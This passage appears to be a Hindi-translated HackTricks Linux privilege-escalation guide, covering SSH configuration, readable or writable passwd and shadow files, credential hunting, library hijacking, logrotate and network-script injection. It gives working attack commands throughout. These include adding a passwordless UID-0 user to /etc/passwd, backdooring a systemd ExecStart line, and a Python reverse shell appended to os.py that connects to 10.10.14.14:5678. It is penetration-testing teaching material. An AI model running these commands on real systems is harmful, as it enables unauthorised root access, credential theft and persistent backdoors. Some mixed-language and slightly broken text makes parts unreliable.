यह बग उन OS में नया ssh key बनाते समय उत्पन्न होता है, क्योंकि **केवल 32,768 परिवर्तनों की संभावना थी**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की हुई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH के रोचक configuration मान

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह बताता है कि सर्वर खाली password string वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key का उपयोग करके लॉगिन कर सकता है।
- `without-password` or `prohibit-password`: root केवल private key के साथ ही लॉगिन कर सकता है।
- `forced-commands-only`: Root केवल private key का उपयोग कर और commands विकल्प निर्दिष्ट होने पर ही लॉगिन कर सकता है।
- `no` : नहीं

### AuthorizedKeysFile

यह उन फ़ाइलों को निर्दिष्ट करता है जिनमें वे public keys होती हैं जिनका उपयोग user authentication के लिए किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदल दिया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**. उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server उपयोग करने देता है। इसलिए, आप **jump** via ssh **to a host** कर पाएँगे और वहाँ से **jump to another** host **using** the **key** जो आपके **initial host** पर स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर कूदता है, उस होस्ट को keys तक पहुँच प्राप्त होगी (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इन **विकल्पों** को **ओवरराइड** कर सकती है और इस कॉन्फ़िगरेशन को अनुमति दे या अस्वीकार कर सकती है।  
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` कीवर्ड के साथ ssh-agent forwarding को **अनुमति** दे सकती है या **अस्वीकृत** कर सकती है (डिफ़ॉल्ट अनुमति है)।

यदि आप पाते हैं कि Forward Agent किसी environment में कॉन्फ़िगर है तो निम्नलिखित पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें वे **स्क्रिप्ट हैं जो तब निष्पादित होती हैं जब कोई उपयोगकर्ता नई shell चलाता है**। इसलिए, यदि आप उनमें से किसी को **लिख या संशोधित कर सकते हैं तो आप privileges escalate कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलती है तो आपको उसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलें अलग नाम से मौजूद हो सकती हैं या उनका बैकअप हो सकता है। इसलिए यह सलाह दी जाती है कि **सभी को ढूंढें** और **जाँच करें कि आप उन्हें पढ़ सकते हैं या नहीं** ताकि देखा जा सके कि फ़ाइलों के अंदर **हैश हैं या नहीं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कभी-कभी आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित commands में से किसी एक का उपयोग करके एक password बनाएँ।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर `hacker` यूज़र जोड़ें और जनरेट किया गया पासवर्ड सेट करें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: आप मशीन की मौजूदा सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित है, और `/etc/shadow` का नाम `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप कुछ संवेदनशील फ़ाइलों में **लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **service configuration file** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **Tomcat सेवा कॉन्फ़िगरेशन फ़ाइल /etc/systemd/ के अंदर संशोधित कर सकते हैं,** तो आप इन पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर निष्पादित होगा।

### फ़ोल्डरों की जाँच करें

निम्न फ़ोल्डर बैकअप या दिलचस्प जानकारी रख सकते हैं: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी को पढ़ने में सक्षम नहीं होंगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में स्क्रिप्ट/बाइनरी**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ज्ञात फ़ाइलें जिनमें passwords शामिल हैं

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का कोड पढ़ें, यह **कई संभावित फ़ाइलों जिनमें passwords हो सकते हैं** की खोज करता है।\
**एक और दिलचस्प टूल** जिसे आप इस काम के लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग Windows, Linux & Mac पर स्थानीय कंप्यूटर में स्टोर की गई बहुत सारी passwords को प्राप्त करने के लिए किया जाता है।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनके अंदर **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना ज्यादा अजीब log होगा, उतना ही वह (शायद) अधिक दिलचस्प होगा।\
इसके अलावा, कुछ "**bad**" तरीके से कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर **रिकॉर्ड passwords** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग पढ़ने के लिए **लॉग पढ़ने वाला समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वाकई बहुत मददगार होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या उनकी **सामग्री** में वह शब्द "**password**" मौजूद हो, और लॉग्स में IPs और emails या hashes regexps भी चेक करें.\

I'm not going to list here how to do all of this but if you are interested you can check the last checks that [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## लिखने योग्य फाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python script किस स्थान से execute होने वाली है और आप उस फ़ोल्डर के अंदर **लिख सकते हैं** या आप **python libraries को संशोधित कर सकते हैं**, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस स्थान पर लिख सकते हैं जहाँ python script execute होगी, तो os.py library को कॉपी और पेस्ट कर दें)।

To **backdoor the library** बस os.py library के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability ऐसी है कि लॉग फ़ाइल या उसकी parent निर्देशिकाओं पर **write permissions** वाले उपयोगकर्ता संभावित रूप से अधिकार बढ़ा सकते हैं। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चल रहा होता है, को arbitrary फ़ाइलें execute करने के लिए manipulate किया जा सकता है, खासकर ऐसी निर्देशिकाओं में जैसे _**/etc/bash_completion.d/**_. यह महत्वपूर्ण है कि केवल _/var/log_ में ही नहीं बल्कि उन किसी भी निर्देशिका की permissions भी जाँचें जहाँ log rotation लागू किया गया है।

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

वulnerability के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, यह जाँचें कि वे logs किसके द्वारा manage किए जा रहे हैं और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि, किसी भी कारण से, कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **write** कर पाने में सक्षम है या किसी मौजूदा स्क्रिप्ट को **adjust** कर सकता है, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcfg-eth0_, नेटवर्क कनेक्शनों के लिए उपयोग किए जाते हैं। वे बिल्कुल .INI फाइलों जैसे दिखते हैं। हालाँकि, उन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute को सही तरीके से हैंडल नहीं किया जाता है। **यदि नाम में white/blank space है तो सिस्टम white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है।** इसका मतलब है कि **पहले blank space के बाद सब कुछ root के रूप में execute हो जाता है।**

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें: Network और /bin/id के बीच रिक्त स्थान है_)

### **init, init.d, systemd, and rc.d**

निर्देशिका `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो क्लासिक Linux service management system है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाले स्क्रिप्ट होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से संबंधित है, जो Ubuntu द्वारा पेश की गई एक नई **service management** पद्धति है और service management कार्यों के लिए configuration files का उपयोग करती है। Upstart में संक्रमण के बावजूद, SysVinit स्क्रिप्ट को Upstart configurations के साथ compatibility layer के कारण अभी भी उपयोग किया जाता है।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ प्रदान करता है। यह फाइलों को वितरण पैकेजों के लिए `/usr/lib/systemd/` और एडमिनिस्ट्रेटर संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे सिस्टम प्रशासन प्रक्रिया सरल होती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर एक syscall को hook करते हैं ताकि privileged kernel functionality को userspace manager के लिए expose किया जा सके। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या खराब password schemes) एक local app को manager का impersonate करने और पहले से-rooted डिवाइसेज़ पर root तक escalate करने में सक्षम बना सकती है। और जानकारी व exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations process command lines से एक binary path निकाल सकता है और उसे privileged context में `-v` के साथ execute कर सकता है। Permissive patterns (उदा., \S का उपयोग) writable स्थानों में attacker-staged listeners (उदा., /tmp/httpd) से मेल खा सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

और जानें तथा अन्य discovery/monitoring स्टैक्स पर लागू होने वाला generalized pattern यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
